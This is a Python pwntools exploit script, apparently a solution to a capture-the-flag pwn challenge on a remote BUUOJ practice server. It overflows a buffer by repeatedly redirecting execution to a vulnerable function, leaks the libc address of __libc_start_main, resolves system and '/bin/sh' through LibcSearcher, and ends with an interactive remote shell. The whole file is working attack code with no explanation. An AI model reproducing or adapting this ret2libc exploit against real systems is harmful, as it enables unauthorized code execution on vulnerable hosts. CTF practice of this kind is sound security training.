from pwn import *
from LibcSearcher import *

context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25990)
elf = ELF('./pwn')

# repeat 3 times of function vul to reach address of __libc_start_main + 241
io.sendafter(b'Welcome, my friend. What\'s your name?\n', cyclic(0x30))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

io.send(cyclic(0x2c) + p32(elf.symbols['vul']))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

io.send(cyclic(0x2c) + p32(elf.symbols['vul']))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

# fourth time, we can get the address of libc
io.send(cyclic(0x2c) + p32(elf.symbols['vul']))

# gdb.attach(io)

io.recv()
rc = io.recv()
print(rc)
libc_start_main = u32(rc[-5:-1]) - 241
print(hex(libc_start_main))
# print(hex(dl_fini))
libc = LibcSearcher('__libc_start_main', libc_start_main)

base = libc_start_main - libc.dump('__libc_start_main')
print(hex(base))
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
print('system: ' + hex(sys))
print('binsh: ' + hex(binsh))
# gdb.attach(io)
io.send(cyclic(0x20) + p32(binsh) * 3 +  p32(elf.symbols['main']))

io.sendafter(b'Welcome, my friend. What\'s your name?\n', cyclic(0x2c) + p32(sys))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

io.send(cyclic(0x2c) + p32(sys))
io.sendafter(b'Hello', cyclic(0x2c) + p32(sys))

io.interactive()